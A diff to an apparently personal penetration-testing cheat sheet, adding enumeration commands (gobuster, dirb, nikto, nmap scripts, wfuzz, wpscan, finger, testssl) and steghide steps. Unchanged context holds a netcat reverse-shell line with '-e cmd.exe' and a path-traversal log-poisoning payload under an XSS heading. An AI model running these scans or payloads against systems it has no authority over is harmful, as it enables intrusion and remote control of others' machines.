@@ -1,3 +1,50 @@
+-------------------- HTTP Enumeration --------------------
+Search for folders with gobuster:
+     # gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
+Dirb - Directory brute force finding using a dictionary file
+     # dirb http://$ip/ wordlist.dict dirb <http://vm/>
+Dirb against a proxy
+     # dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129
+Get Options available from web server 
+     # curl -vX OPTIONS vm/test
+Uniscan directory finder:
+     # uniscan -qweds -u <http://vm/>   
+     
+-------------------- Nikto --------------------
+Nikto Basic
+     nikto -h $ip
+Proxy Enumeration (useful for open proxies)
+     # nikto -useproxy http://$ip:3128 -h $ip
+
+-------------------- RSH Enumeration --------------------
+RSH Enumeration - Unencrypted file transfer system
+     # auxiliary/scanner/rservices/rsh_login
+
+-------------------- TLS & SSL --------------------
+TLS & SSL Testing
+     # ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
+     
+-------------------- Finger --------------------
+Finger Enumeration
+finger @$ip
+finger batman@$ip
+
+-------------------- NMAP --------------------
+HTTP Enumeration with NMAP
+     # nmap --script=http-enum -p80 -n $ip/24
+Nmap Check the server methods
+     # nmap --script http-methods --script-args http-methods.url-path='/test' $ip
+
+-------------------- Fuzzing --------------------
+Wfuzz - The web brute forcer
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test 
+wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ 
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
+
+-------------------- Wordpress --------------------
+WordPress Scan - Wordpress security scanner
+     # wpscan --url $ip/blog --proxy $ip:3129
+
 -------------------- XSS --------------------
 On attacker machine set listener 
      # nc -nlvp <[PORT]>
@@ -8,6 +55,12 @@ On victim website
 Connect via netcat to victim 
      # nc -nv <[IP]> <[PORT]>) 
      # nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
+     
+-------------------- Steganography --------------------
+# apt-get install steghide
+# steghide extract -sf picture.jpg
+# steghide info picture.jpg
+# apt-get install stegosuite
      
 -------------------- SQL Injection --------------------
 Bse:
